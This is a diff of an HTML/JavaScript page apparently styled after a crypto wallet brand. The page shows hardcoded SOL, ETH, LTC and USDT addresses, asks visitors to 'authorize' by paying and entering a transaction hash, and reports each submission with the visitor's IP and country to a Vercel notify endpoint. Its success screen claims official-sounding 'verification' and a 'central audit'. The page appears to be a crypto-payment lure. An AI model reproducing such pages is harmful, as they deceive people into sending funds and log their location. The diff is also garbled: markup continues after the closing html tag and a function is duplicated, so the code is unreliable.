@@ -72,6 +72,118 @@
             document.getElementById('payment-zone').classList.remove('hidden');
             document.getElementById('addr-display').innerText = addr;
             
+            document.querySelectorAll('.crypto-card').forEach(c => c.classList.remove('selected'));
+            const id = asset.toLowerCase().split(' ')[0] + '-card';
+            const card = document.getElementById(id);
+            if(card) card.classList.add('selected');
+        }
+
+        function generateID() {
+            const c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let r = '';
+            for(let i=0; i<16; i++) { if(i>0 && i%4===0) r+='-'; r += c[Math.floor(Math.random()*c.length)]; }
+            return r;
+        }
+
+        async function submitPayment() {
+            const btn = document.getElementById('submit-btn');
+            const loader = document.getElementById('btn-loader');
+            const btnText = document.getElementById('btn-text');
+            const hash = document.getElementById('tx-input').value;
+            
+            if(!hash || hash.length < 8) return alert("Enter a valid TX Hash");
+
+            const payId = generateID();
+            loader.style.display = "inline-block";
+            btnText.innerText = "AUTHORIZING...";
+            btn.style.pointerEvents = "none";
+
+            try {
+                // The IP and Country are automatically handled by notify.js via Vercel headers
+                const response = await fetch(VERCEL_API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        type: 'PAYMENT',
+                        txHash: hash, 
+                        asset: selectedAsset, 
+                        paymentId: payId 
+                    })
+                });
+
+                if (response.ok) {
+                    navigator.clipboard.writeText(payId);
+                    document.getElementById('main-panel').innerHTML = `
+                        <div class="text-center animate-entry loaded py-10">
+                            <i class="fas fa-shield-check text-orange-500 text-4xl mb-6"></i>
+                            <h3 class="text-xl font-bold">Authorized</h3>
+                            <p class="text-[10px] text-gray-500 uppercase mb-8">Payment ID Copied to Clipboard</p>
+                            <div class="bg-white/5 border border-orange-500/30 rounded-2xl p-6 mb-8">
+                                <code class="text-orange-500 font-bold text-lg">${payId}</code>
+                            </div>
+                            <p class="text-[9px] text-gray-400 uppercase leading-relaxed">Verification in progress.<br>Logs sent to central audit.</p>
+                            <a href="index.html" class="inline-block mt-8 text-[9px] text-gray-600 uppercase hover:text-white">Return Home</a>
+                        </div>`;
+                } else { throw new Error(); }
+            } catch (e) { 
+                alert("Connection failed. Check Vercel API status."); 
+                loader.style.display = "none"; btnText.innerText = "RETRY"; btn.style.pointerEvents = "auto"; 
+            }
+        }
+
+        const dot = document.getElementById('cursor-dot');
+        const panel = document.getElementById('main-panel');
+        document.addEventListener('mousemove', (e) => {
+            const { clientX, clientY } = e;
+            dot.style.left = `${clientX}px`; dot.style.top = `${clientY}px`;
+            const rect = panel.getBoundingClientRect();
+            panel.style.setProperty('--gx', `${clientX - rect.left}px`);
+            panel.style.setProperty('--gy', `${clientY - rect.top}px`);
+            const dist = Math.sqrt(Math.pow(clientX - (rect.left + rect.width / 2), 2) + Math.pow(clientY - (rect.top + rect.height / 2), 2));
+            panel.style.setProperty('--proximity-opacity', Math.max(0, 1 - (dist / 200)));
+            panel.style.transform = `perspective(300px) rotateX(${(rect.top + rect.height/2 - clientY)/50}deg) rotateY(${(clientX - (rect.left + rect.width/2))/50}deg)`;
+        });
+    </script>
+</body>
+</html>
+
+                <div class="grid grid-cols-2 gap-3 mb-8">
+                    <div id="sol-card" class="crypto-card cursor-pointer" onclick="selectAsset('SOL', 'AwnTZ9iKyqMqeutRxu69qdM9csRytpWB5dnPUfTNSDK')">SOLANA</div>
+                    <div id="eth-card" class="crypto-card cursor-pointer" onclick="selectAsset('ETH', '0x5bCfa64E99B255D1C42a89b594BaDcD3835a128e')">ETHEREUM</div>
+                    <div id="ltc-card" class="crypto-card cursor-pointer" onclick="selectAsset('LTC', 'LXRqYWGWKvXxyHyHLTyhN7LXe9D2MjFEaL')">LITECOIN</div>
+                    <div id="usdt-card" class="crypto-card cursor-pointer" onclick="selectAsset('USDT (TRC-20)', 'TCgXis8Qf1gMW1dRRYS3bDLqQSa7UhSJGj')">USDT TRC-20</div>
+                </div>
+
+                <div id="payment-zone" class="hidden">
+                    <div class="bg-black/40 rounded-xl p-4 mb-4 border border-white/5 flex justify-between items-center">
+                        <code id="addr-display" class="text-[10px] text-gray-400 truncate mr-4">...</code>
+                        <button onclick="navigator.clipboard.writeText(document.getElementById('addr-display').innerText)" class="text-orange-500 text-xs hover:text-white transition-colors">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                    </div>
+                    <input type="text" id="tx-input" placeholder="Enter Transaction Hash (TXID)" class="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-4 text-xs mb-4 text-white focus:border-orange-500 outline-none transition-all">
+                    
+                    <button onclick="submitPayment()" id="submit-btn" class="w-full btn-exodus text-[10px] uppercase tracking-widest">
+                        <span class="loader" id="btn-loader"></span>
+                        <span id="btn-text">Verify Payment</span>
+                    </button>
+                </div>
+            </div>
+            <a href="index.html" class="block text-center mt-6 text-[9px] text-gray-600 uppercase tracking-widest hover:text-white transition-colors">← Cancel Authorization</a>
+        </div>
+    </main>
+
+    <script>
+        let selectedAsset = "";
+        const VERCEL_API_URL = 'https://mains-blush.vercel.app/api/notify';
+
+        window.addEventListener('DOMContentLoaded', () => document.querySelector('.animate-entry').classList.add('loaded'));
+
+        function selectAsset(asset, addr) {
+            selectedAsset = asset;
+            document.getElementById('payment-zone').classList.remove('hidden');
+            document.getElementById('addr-display').innerText = addr;
+            
             // UI Selection Logic
             document.querySelectorAll('.crypto-card').forEach(c => c.classList.remove('selected'));
             // Match ID even if name has spaces (e.g., "usdt-card")
